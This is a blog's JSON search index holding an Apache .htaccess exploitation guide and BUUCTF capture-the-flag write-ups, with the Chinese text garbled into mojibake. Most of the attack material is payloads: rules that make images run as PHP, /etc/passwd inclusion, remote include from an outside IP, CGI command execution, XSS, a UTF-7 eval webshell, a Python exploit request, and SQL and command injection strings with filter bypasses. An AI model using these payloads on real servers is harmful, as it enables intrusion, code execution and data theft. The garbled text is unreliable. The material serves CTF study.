[{"content":"hello world 666\n111\n","date":"2025-07-07T18:48:57+08:00","permalink":"https://0d000721999.github.io/p/test/","title":"Test"},{"content":"Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§ å‚è€ƒï¼šApacheçš„.htaccessåˆ©ç”¨æŠ€å·§-å…ˆçŸ¥ç¤¾åŒº\nä½œç”¨èŒƒå›´ .htaccess æ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº .htaccess æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ï¼Œä½†æ˜¯å¾ˆé‡è¦çš„ã€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…¶ä¸Šçº§ç›®å½•ä¹Ÿå¯èƒ½ä¼šæœ‰ .htaccess æ–‡ä»¶ï¼Œè€ŒæŒ‡ä»¤æ˜¯æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¯èƒ½ä¼šè¦†ç›–å…¶ä¸Šçº§ç›®å½•ä¸­çš„ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå³å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚\né…ç½®æ–‡ä»¶ å¯åŠ¨ .htaccessï¼Œéœ€è¦åœ¨æœåŠ¡å™¨çš„ä¸»é…ç½®æ–‡ä»¶å°† AllowOverride è®¾ç½®ä¸º Allï¼Œå¦‚ apache2.conf\n1 AllowOverride All #å¯åŠ¨.htaccessæ–‡ä»¶çš„ä½¿ç”¨ ä¹Ÿå¯ä»¥å°† .htaccess ä¿®æ”¹ä¸ºå…¶ä»–å\n1 AccessFileName .config #å°†.htaccessä¿®æ”¹ä¸º.config å¸¸è§æŒ‡ä»¤ å…·ä½“åŠŸèƒ½å¯ä»¥çœ‹http://www.htaccess-guide.com/\nSetHandler SetHandler å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç† ç”¨æ³•ï¼š\n1 SetHandler handler-name|None ç¤ºä¾‹1ï¼š\n1 SetHandler application/x-httpd-php æ­¤æ—¶å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“åš php è§£æ\nç¤ºä¾‹2ï¼š\n1 SetHandler server-status apacheçš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯(é»˜è®¤å…³é—­)ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è®¿é—®æœ¬ç«™çš„è®°å½•\nè®¿é—®ä»»æ„ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ŒåŠ å‚æ•° ?refresh=5 æ¥å®ç°æ¯éš” 5s è‡ªåŠ¨åˆ·æ–°\næ¯”å¦‚sever?refresh=5\nAddHandler AddHandler å¯ä»¥åœ¨æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å¤„ç†å™¨ä¹‹é—´å»ºç«‹æ˜ å°„ ç”¨æ³•:\n1 AddHandler handler-name extension [extension] ... ä¾‹å¦‚ï¼š\n1 AddHandler cgi-script .xxx å°†æ‰©å±•åä¸º .xxx çš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†\nAddType AddType å¯ä»¥å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹ ç”¨æ³•ï¼š\n1 AddType media-type extension [extension] ... ç¤ºä¾‹ï¼š\n1 AddType application/x-httpd-php .gif å°†ä»¥ gif ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æ\n1 AddType application/x-httpd-php png jpg gif å°†ä»¥ .png .jpg .gif å¤šä¸ªåç¼€å½“åš php è§£æ\nphp_value å½“ä½¿ç”¨ PHP ä½œä¸º Apache æ¨¡å—æ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨ Apache çš„é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ httpd.confï¼‰å’Œ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤æ¥ä¿®æ”¹ php çš„é…ç½®è®¾å®šã€‚éœ€è¦æœ‰AllowOverride Options æˆ–AllowOverride All æƒé™æ‰å¯ä»¥ã€‚\nphp_value è®¾å®šæŒ‡å®šçš„å€¼ã€‚è¦æ¸…é™¤å…ˆå‰è®¾å®šçš„å€¼ï¼ŒæŠŠ value è®¾ä¸º noneã€‚ä¸è¦ç”¨ php_value è®¾å®šå¸ƒå°”å€¼ã€‚åº”è¯¥ç”¨ php_flagã€‚\nç”¨æ³•ï¼š\n1 php_value name value PHP: é…ç½®å¯è¢«è®¾å®šèŒƒå›´ - Manual\nç”±ä¸Šå¯çŸ¥ .htaccess åªèƒ½ç”¨äº PHP_INI_ALL æˆ– PHP_INI_PERDIR ç±»å‹çš„æŒ‡ä»¤ã€‚\nPHP: php.ini é…ç½®é€‰é¡¹åˆ—è¡¨ - Manual\nå¯ä»¥æ‰¾åˆ°å¯ç”¨æŒ‡ä»¤\n(1) æ–‡ä»¶åŒ…å«é…ç½®é€‰é¡¹\nauto_prepend_fileï¼šåœ¨ä¸»æ–‡ä»¶è§£æä¹‹å‰è‡ªåŠ¨è§£æåŒ…å«çš„æ–‡ä»¶ auto_append_fileï¼šåœ¨ä¸»æ–‡ä»¶è§£æåè‡ªåŠ¨è§£æåŒ…å«çš„æ–‡ä»¶ ä¾‹å¦‚:\n1 php_value auto_prepend_file images.png è®¿é—®ä¸€ä¸ª php æ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨è§£æ images.png æ–‡ä»¶\n(2) ç»•è¿‡preg_match\nä¾‹å¦‚ï¼š\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 è®¾ç½®æ­£åˆ™å›æœ”æ¬¡æ•°æ¥ä½¿æ­£åˆ™åŒ¹é…çš„ç»“æœè¿”å›ä¸º false è€Œä¸æ˜¯0 ï¼Œä»è€Œå¯ä»¥ç»•è¿‡æ­£åˆ™ã€‚\nphp_flag php_flag ç”¨æ¥è®¾å®šå¸ƒå°”å€¼çš„ php é…ç½®æŒ‡ä»¤ ç”¨æ³•ï¼š\n1 php_flag name on|off PHP: php.ini é…ç½®é€‰é¡¹åˆ—è¡¨ - Manual\næ‰¾åˆ°å¯ç”¨æŒ‡ä»¤\nå¯ä»¥å°† engine è®¾ç½®ä¸º 0,åœ¨æœ¬ç›®å½•å’Œå­ç›®å½•ä¸­å…³é—­ php è§£æ,é€ æˆæºç æ³„éœ²\n1 php_flag engine 0 åˆ©ç”¨æ–¹å¼ æ–‡ä»¶è§£æ ç»å¸¸å‡ºç°åœ¨æ–‡ä»¶ä¸Šä¼ çš„é»‘åå•æ²¡æœ‰é™åˆ¶ .htaceess åç¼€ï¼Œé€šè¿‡ä¸Šä¼  .htaccess æ–‡ä»¶ï¼Œå†ä¸Šä¼ å›¾ç‰‡ï¼Œä½¿å›¾ç‰‡çš„ php æ¶æ„ä»£ç å¾—ä»¥è¢«è§£ææ‰§è¡Œ\n.htaccess æ–‡ä»¶å†…å®¹æœ‰å¦‚ä¸‹ä¸¤ç§\n1.SetHandler æŒ‡ä»¤\n1 2 3 4 # å°†images.png å½“åš PHP æ‰§è¡Œ \u0026lt;FilesMatch \u0026#34;images.png\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 2.AddType\n1 2 # å°† .jpg å½“åš PHP æ–‡ä»¶è§£æ AddType application/x-httpd-php .jpg æ–‡ä»¶åŒ…å« æœ¬åœ°æ–‡ä»¶åŒ…å« é€šè¿‡ php_value æ¥è®¾ç½® auto_prepend_fileæˆ–è€… auto_append_file é…ç½®é€‰é¡¹åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶, åŒæ—¶åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•ä¸­éœ€è¦æœ‰å¯è§£æçš„ php æ–‡ä»¶æ¥è§¦å‘ã€‚\n.htaccess åˆ†åˆ«é€šè¿‡è¿™ä¸¤ä¸ªé…ç½®é€‰é¡¹æ¥åŒ…å« /etc/passwd,å¹¶è®¿é—®åŒç›®å½•ä¸‹çš„ index.phpæ–‡ä»¶ã€‚\nauto_prepend_file\n1 php_value auto_prepend_file /etc/passwd auto_append_file\n1 php_value auto_append_file /etc/passwd è¿œç¨‹æ–‡ä»¶åŒ…å« PHP çš„ all_url_include é…ç½®é€‰é¡¹è¿™ä¸ªé€‰é¡¹é»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¼€å¯çš„è¯å°±å¯ä»¥è¿œç¨‹åŒ…å«ã€‚å› ä¸º all_url_include çš„é…ç½®èŒƒå›´ä¸º PHP_INI_SYSTEM,æ‰€ä»¥æ— æ³•åˆ©ç”¨ php_flag åœ¨ .htaccess ä¸­å¼€å¯ã€‚\nåœ¨ php.ini ä¸­è®¾ç½® all_url_include ä¸º On\n1 php_value auto_append_file http://10.87.9.156/phpinfo.txt ç„¶åè®¿é—®ç›®å½•ä¸‹phpæ–‡ä»¶åå°±ä¼šå‡ºç°phpinfo\næºç æ³„éœ² åˆ©ç”¨ php_flag å°† engine è®¾ç½®ä¸º 0,åœ¨æœ¬ç›®å½•å’Œå­ç›®å½•ä¸­å…³é—­ php è§£æ,é€ æˆæºç æ³„éœ²\n1 php_flag engine 0 è¿™é‡Œåœ¨è°·æ­Œæµè§ˆå™¨è®¿é—®ä¼šæ˜¾ç¤ºæºç ï¼Œç”¨å…¶ä»–æµè§ˆå™¨è®¿é—®ä¼šæ˜¾ç¤ºç©ºç™½ï¼Œè¿˜éœ€æŸ¥çœ‹æºç ï¼Œæ‰å¯çœ‹åˆ°æ³„éœ²çš„æºç \nä»£ç æ‰§è¡Œ 1.åˆ©ç”¨ä¼ªåè®® all_url_fopenã€all_url_include ä¸º On\n1 2 php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== #php_value auto_append_file data://text/plain,\u0026lt;?php phpinfo(); 2.è§£æ.htaccess æ–¹æ³•ä¸€ï¼š\n1 2 php_value auto_append_file .htaccess #\u0026lt;?php phpinfo(); è§£æå®Œä¼šå˜æˆ\n1 2 php_value auto_append_file .htaccess # ä¸‹é¢æŠŠphpinfoè§£æäº† æ–¹æ³•äºŒï¼š è¿™ç§é€‚åˆåŒç›®å½•æˆ–å­ç›®å½•æ²¡æœ‰ php æ–‡ä»¶ã€‚ éœ€è¦å…ˆè®¾ç½®å…è®¸å¯è®¿é—® .htaccess æ–‡ä»¶\n1 2 3 4 5 \u0026lt;Files ~ \u0026#34;^.ht\u0026#34;\u0026gt; Require all granted Order allow,deny Allow from all \u0026lt;/Files\u0026gt; ç„¶åå†å°† .htaccessæŒ‡å®šå½“åš phpæ–‡ä»¶å¤„ç†\n1 2 SetHandler application/x-httpd-php # \u0026lt;?php phpinfo(); ?\u0026gt; æœ€åä¼šè¢«è§£æä¸º\n1 2 Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php # ä¸‹é¢phpinfoè¢«è§£æäº† å‘½ä»¤æ‰§è¡Œ CGIå¯åŠ¨ cgi_module éœ€è¦åŠ è½½ï¼Œå³ apache é…ç½®æ–‡ä»¶ä¸­æœ‰\n1 LoadModule cgi_module modules/mod_cgi.so .htaccesså†…å®¹\n1 2 Options ExecCGI #å…è®¸CGIæ‰§è¡Œ AddHandler cgi-script .xx #å°†xxåç¼€åçš„æ–‡ä»¶ï¼Œå½“åšCGIç¨‹åºè¿›è¡Œè§£æ ce.xxå†…å®¹ï¼ˆå¼¹è®¡ç®—å™¨\n1 2 #!C:/Windows/System32/cmd.exe /k start calc.exe 6 ä¾‹é¢˜å¯çœ‹ [De1CTF2020 check in](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in)\nDe1CTF2020 check in é¢„æœŸè§£\n.htaccess:\n1 2 Options +ExecCGI AddHandler cgi-script .xx 1.xx:\n1 2 3 4 5 6 7 #! /bin/bash echo Content-type: text/html echo \u0026#34;\u0026#34; cat /flag æ³¨ï¼šè¿™é‡Œè®²ä¸‹ä¸€ä¸ªå°å‘ï¼Œlinuxä¸­cgiæ¯”è¾ƒä¸¥æ ¼ ä¸Šä¼ åå‘ç°çŠ¶æ€ç 500ï¼Œæ— æ³•è§£ææˆ‘ä»¬bashæ–‡ä»¶ã€‚å› ä¸ºæˆ‘ä»¬çš„ç›®æ ‡ç«™ç‚¹æ˜¯linuxç¯å¢ƒï¼Œå¦‚æœæˆ‘ä»¬ç”¨(windowsç­‰)æœ¬åœ°ç¼–è¾‘å™¨ç¼–å†™ä¸Šä¼ æ—¶ç¼–ç ä¸ä¸€è‡´å¯¼è‡´æ— æ³•è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨linuxç¯å¢ƒä¸­ç¼–å†™å¹¶å¯¼å‡ºå†ä¸Šä¼ ã€‚\néé¢„æœŸè§£\nåæ–œæ ç»•è¿‡æ­£åˆ™\n.htaccess:\n1 2 AddType application/x-httpd-p\\ hp .xx 1.xx\n1 \u0026lt;?=\u0026#39;cat /flag\u0026#39;; æˆ–è€…ç™½å«–flag\nåˆ©ç”¨apacheçš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯(é»˜è®¤å…³é—­) .htaccess:\n1 SetHandler server-status ä¸Šä¼ æ–‡ä»¶åï¼Œè®¿é—®è‡ªå·±çš„ç›®å½•å°±å‘ç°æ˜¯apacheçš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä»–äººçš„è®¿é—®æœ¬ç½‘ç«™çš„è®°å½•\nFastCGIå¯åŠ¨ mod_fcgid.soéœ€è¦è¢«åŠ è½½ã€‚å³ apache é…ç½®æ–‡ä»¶ä¸­æœ‰\n1 LoadModule fcgid_module modules/mod_fcgid.so .htaccess\n1 2 3 Options +ExecCGI AddHandler fcgid-script .xx FcgidWrapper \u0026#34;C:/Windows/System32/cmd.exe /k start calc.exe\u0026#34; .xx ce.xxå†…å®¹éšä¾¿å¡«ï¼Œå°±èƒ½å¼¹è®¡ç®—å™¨äº†\nXSS highlight_file .htaccess\n1 php_value highlight.comment \u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#39; å…¶ä¸­çš„ highlight.comment ä¹Ÿå¯ä»¥æ¢æˆå¦‚ä¸‹å…¶ä»–é€‰é¡¹\nPHP: è¿è¡Œæ—¶é…ç½® - Manual\nindex.php\n1 2 3 \u0026lt;?php highlight_file(__FILE__); // comment å°±ä¼šå¼¹xss\né”™è¯¯æ¶ˆæ¯é“¾æ¥ index.php ï¼š\n1 2 \u0026lt;?php include(\u0026#39;foo\u0026#39;);#fooæŠ¥é”™ .htaccess\n1 2 3 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#34; åˆ©ç”¨æŠ¥é”™æ¥xss\nè‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ error.php\n1 \u0026lt;?php include(\u0026#39;shell\u0026#39;);#æŠ¥é”™é¡µé¢ .htaccess\n1 2 php_value error_log /tmp/www/html/shell.php php_value include_path \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; è®¿é—® error.phpï¼Œä¼šæŠ¥é”™å¹¶è®°å½•åœ¨ shell.php æ–‡ä»¶ä¸­\nå› ä¸º\u0026lt;?æ ‡ç­¾ä¼šç»è¿‡ html ç¼–ç ï¼Œæ‰€ä»¥éœ€è¦ UTF-7 æ¥ç»•è¿‡ã€‚\n.htaccess\n1 2 3 4 5 6 7 8 9 # ç¬¬ä¸€æ¬¡ php_value error_log /tmp/shell #å®šä¹‰é”™è¯¯è·¯å¾„ #---- \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; in UTF-7: php_value include_path \u0026#34;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # ç¬¬äºŒæ¬¡ php_value include_path \u0026#34;/tmp\u0026#34; #å°†include()çš„é»˜è®¤è·¯å¾„æ”¹å˜ php_flag zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; è¿™ç§æ–¹æ³•åœ¨è¿™é¢˜æœ‰è®°å½•ï¼šOurChallenges/XNUCA2019Qualifier/Web/Ezphp at master Â· NeSE-Team/OurChallenges Â· GitHub\nXNUCA2019 ezphp é¢„æœŸè§£\nhtaccessç”Ÿæ•ˆ\nå¦‚æœå°è¯•ä¸Šä¼ htaccessæ–‡ä»¶ä¼šå‘ç°å‡ºç°å“åº”500çš„é—®é¢˜ï¼Œå› ä¸ºæ–‡ä»¶å°¾æœ‰Just one chance è¿™é‡Œé‡‡ç”¨# \\çš„æ–¹å¼å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ï¼Œå°±å¯ä»¥ç”¨#æ¥æ³¨é‡Šå•è¡Œäº†ã€‚\nåˆ©ç”¨æ–‡ä»¶åŒ…å«\nä»£ç ä¸­æœ‰ä¸€å¤„include_once(\u0026quot;fl3g.php\u0026quot;);ï¼Œphpçš„é…ç½®é€‰é¡¹ä¸­æœ‰include_pathå¯ä»¥ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„ã€‚å¦‚æœtmpç›®å½•ä¸‹æœ‰fl3g.phpï¼Œåœ¨å¯ä»¥é€šè¿‡å°†include_pathè®¾ç½®ä¸ºtmpçš„æ–¹å¼æ¥å®Œæˆæ–‡ä»¶åŒ…å«ã€‚\ntmpç›®å½•å†™æ–‡ä»¶\nå¦‚ä½•åœ¨æŒ‡å®šç›®å½•å†™æŒ‡å®šæ–‡ä»¶åçš„æ–‡ä»¶å‘¢ï¼Ÿphpçš„é…ç½®é€‰é¡¹ä¸­æœ‰error_logå¯ä»¥æ»¡è¶³è¿™ä¸€ç‚¹ã€‚error_logå¯ä»¥å°†phpè¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚ å¦‚ä½•è§¦å‘æŠ¥é”™å‘¢ï¼Ÿè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä»£ç ä¸­å†™äº†ä¸€å¤„ä¸å­˜åœ¨çš„fl3g.phpçš„åŸå› ã€‚æˆ‘ä»¬å¯ä»¥å°†include_pathçš„å†…å®¹è®¾ç½®æˆpayloadçš„å†…å®¹ï¼Œè¿™æ—¶è®¿é—®é¡µé¢ï¼Œé¡µé¢å°è¯•å°†payloadä½œä¸ºä¸€ä¸ªè·¯å¾„å»è®¿é—®æ—¶å°±ä¼šå› ä¸ºæ‰¾ä¸åˆ°fl3g.phpè€ŒæŠ¥é”™ï¼Œè€Œå¦‚æœfl3g.phpå­˜åœ¨ï¼Œåˆ™ä¼šå› ä¸ºinclude_pathé»˜è®¤å…ˆè®¿é—®webç›®å½•è€Œä¸ä¼šæŠ¥é”™ã€‚ å†™è¿›error_logçš„å†…å®¹ä¼šè¢«htmlç¼–ç æ€ä¹ˆç»•è¿‡ï¼Ÿè¿™ä¸ªç‚¹æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œé‡‡ç”¨utf7ç¼–ç å³å¯ã€‚ payload\nç¬¬ä¸€æ­¥ï¼Œé€šè¿‡error_logé…åˆinclude_pathåœ¨tmpç›®å½•ç”Ÿæˆshell 1 2 3 4 php_value error_log /tmp/fl3g.php php_value error_reporting 32767 php_value include_path \u0026#34;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # \\ ç¬¬äºŒæ­¥ï¼Œé€šè¿‡include_pathå’Œutf7ç¼–ç æ‰§è¡Œshell 1 2 3 4 php_value include_path \u0026#34;/tmp\u0026#34; php_value zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; # \\ éé¢„æœŸ1\nå› ä¸ºæ­£åˆ™åˆ¤æ–­å†™çš„æ˜¯if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) == 1) {è€Œä¸æ˜¯if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) !== 0) {ï¼Œå› æ­¤å­˜åœ¨äº†è¢«ç»•è¿‡çš„å¯èƒ½ã€‚ é€šè¿‡è®¾ç½®.htaccess\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 å¯¼è‡´preg_matchè¿”å›Falseï¼Œç»§è€Œç»•è¿‡äº†æ­£åˆ™åˆ¤æ–­ï¼Œfilenameå³å¯é€šè¿‡ä¼ªåè®®ç»•è¿‡å‰é¢stristrçš„åˆ¤æ–­å®ç°Getshellã€‚\néé¢„æœŸ2\nåæ–œæ ç»•è¿‡\n1 2 php_value auto_prepend_fi\\ le \u0026#34;.htaccess\u0026#34; è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 import requests htaccess = \u0026#39;\u0026#39;\u0026#39;php_value auto_prepend_fi\\\\ le \u0026#34;.htaccess\u0026#34; %23\u0026lt;?php system(\u0026#39;cat /????\u0026#39;);?\u0026gt;\\\\\u0026#39;\u0026#39;\u0026#39; url = \u0026#39;http://ddd0daaf-fee4-4af5-b7bb-9f0d7dfbe6ef.node5.buuoj.cn:81/?filename={}\u0026amp;content={}\u0026#39;.format(\u0026#39;.htaccess\u0026#39;, htaccess) r = requests.get(url=url) print(r.status_code) print(r.text) ","date":"2025-04-06T00:00:00Z","image":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png","permalink":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§"},{"content":"buuctf 1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL è¿›å»çŒœé—­åˆæ–¹å¼\nå•å¼•å·é—­åˆ\nå°è¯•ä¸‡èƒ½å¯†ç ç™»å…¥\n1 2 username=1\u0026#39; or true# password=1\u0026#39; or true# 2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun æŸ¥çœ‹æºç è¦getä¼ catçš„å€¼ä¸ºdog\n1 ?cat=dog 3ã€[HCTF 2018]WarmUp æŸ¥çœ‹æºç source.php\nç™½åå•åªæœ‰source.phpå’Œhint.php,æ–‡ä»¶åŒ…å«ä¼ fileå‚æ•°,ä¸”æœ‰?æˆªæ–­\næŸ¥çœ‹hint.php\n1 http://347210bf-0468-4578-89c6-04af275f9312.node5.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg å¾€ä¸Šè·³ç›®å½•æŸ¥æ‰¾\n4ã€[ACTF2020 æ–°ç”Ÿèµ›]Include é¢˜ç›®æç¤ºäº†æ–‡ä»¶åŒ…å«ï¼Œè¦æŸ¥çœ‹flag.phpæ–‡ä»¶\nç”¨åˆ°phpä¼ªåè®®å°è£…\n1 php://filter/read=convert.base64-encode/resource=xxx.php è¿™é¢˜ç›´æ¥\n1 /?file=php://filter/read=convert.base64-encode/resource=flag.php ç„¶åbase64è§£ç \nå°±å¾—åˆ°flag\n5ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec ç®€å•çš„rce\n1 2 ip;ls / ip;cd /;cat /flag 6ã€[GXYCTF2019]Ping Ping Ping å°è¯•äº†å¥½ä¹…æ„Ÿè§‰flagåå­—è¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰ç©ºæ ¼è¿‡æ»¤\nå…ˆæŸ¥çœ‹index.php\n1 http://41313055-4ac6-4251-8b42-bee9bd416efc.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9index.php æ–¹æ³•ä¸€ï¼šå˜é‡æ‹¼æ¥å­—ç¬¦ä¸²â€”â€”å°†açš„å€¼è¦†ç›–ï¼Œç„¶åè¿›è¡Œç»•è¿‡ 1 /?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php ç„¶åæŸ¥çœ‹æºç å¾—åˆ°flag\næ–¹æ³•äºŒï¼šå†…è”æ‰§è¡Œ å†…è”å‡½æ•°ï¼šå°†æŒ‡å®šçš„å‡½æ•°ä½“æ’å…¥å¹¶å–ä»£æ¯ä¸€å¤„è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ã€‚\nåå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œï¼Œæ‰§è¡Œè¾“å‡ºç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´\n1 cat `ls` //æ‰§è¡Œlsè¾“å‡º index.php å’Œ flag.php ã€‚ç„¶åå†æ‰§è¡Œ cat flag.php;cat index.php 1 /?ip=127.0.0.1;cat$IFS$9`ls` æ–¹æ³•ä¸‰ï¼šshå‘½ä»¤æ¥æ‰§è¡Œ åŠ å¯†å‘½ä»¤ echo â€œcat flag.phpâ€ | base64 è§£å¯†å‘½ä»¤å¹¶æ‰§è¡Œ echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh\n1 /?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh 7ã€[SUCTF 2019]EasySQL å°è¯•å¾ˆå¤šé—­åˆæ–¹å¼éƒ½å›æ˜¾nonono\nå°è¯•å †å æ³¨å…¥\n1 2 1;show databases; 1;show tables; å¯ä»¥çœ‹åˆ°flagåº”è¯¥åœ¨Flagè¡¨ä¸­\nè¾“å…¥é0æ•°å­—\u0026ndash;æœ‰ä¼šæ˜¾ï¼Œè¾“å…¥0æˆ–å­—æ¯\u0026ndash;æ²¡æœ‰å›æ˜¾\nç”±æ­¤å¯ä»¥çŒœæµ‹åç«¯ä»£ç å«æœ‰||æˆ–orè¿ç®—ç¬¦\n1 2 3 4 5 6 7 select command1 || command2 æƒ…å†µä¸€ï¼šè‹¥command1ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚ æƒ…å†µäºŒï¼šè‹¥command1ä¸º0æˆ–å­—æ¯ï¼Œcommand2ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚ æƒ…å†µä¸‰ï¼šcommand1å’Œcommand2éƒ½ä¸ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º0ã€‚ æ–¹æ³•ä¸€ï¼šä½¿ç”¨ sql_mode ä¸­çš„ PIPES_AS_CONCAT å‡½æ•° PIPES_AS_CONCATï¼šå°† || æˆ–è¿ç®—ç¬¦ è½¬æ¢ä¸º è¿æ¥å­—ç¬¦ï¼Œå³å°†||å‰åæ‹¼æ¥åˆ°ä¸€èµ·ã€‚\nselect 1 || flag from Flagçš„æ„æ€å°†å˜æˆ å…ˆæŸ¥è¯¢1 å†æŸ¥è¯¢ flagï¼Œè€Œä¸æ˜¯æŸ¥è¯¢1flag,åªæ˜¯æŸ¥è¯¢çš„ç»“æœä¼šæ‹¼æ¥åˆ°ä¸€èµ·\n1 1;sql_mode=PIPES_AS_CONCAT;select 1 æ–¹æ³•äºŒï¼šåˆ©ç”¨éé¢„æœŸæ¼æ´è·å–flag è‹¥è¾“å…¥1ï¼Œ1ã€‚é‚£ä¹ˆsqlè¯­å¥å°±å˜æˆäº† select 1, 1 || flag from Flagã€‚å…¶ä¸­ç”± [1] å’Œ [1 || flag] ä¸¤éƒ¨åˆ†ç»„æˆï¼Œè€Œé [1,1] || [flag]ã€‚éé¢„æœŸæ¼æ´æ˜¯åˆ©ç”¨æ•°æ®åº“å¯¹ç¬¦å·åˆ¤æ–­çš„ä¸å‡†ç¡®å½¢æˆçš„æ¼æ´ã€‚\n1 *,1 è¾“å…¥ *ï¼Œ1 åï¼Œsqlè¯­å¥å°±å˜æˆäº† select * , 1 || flag from Flagã€‚\nå…¶ä¸­åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š (1) select * from Flag(2) select 1 || flag from Flagã€‚\n8ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL å•å¼•å·é—­åˆ\nå°è¯•è”åˆæ³¨å…¥\n1 -1\u0026#39; union select 1,database(),version()# çˆ†å‡ºæ•°æ®åº“åæ˜¯geek\n1 2 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;l0ve1ysq1\u0026#39;# 1 2 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from l0ve1ysq1)# ç„¶åæŸ¥çœ‹æºç å°±å¾—åˆ°flag\n9ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ é—­åˆæ–¹å¼ä¸ºå•å¼•å·\nåé¢è”åˆæŸ¥è¯¢å›æ˜¾äº†è¿‡æ»¤çš„å­—ç¬¦\nç”¨å †å æ³¨å…¥\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 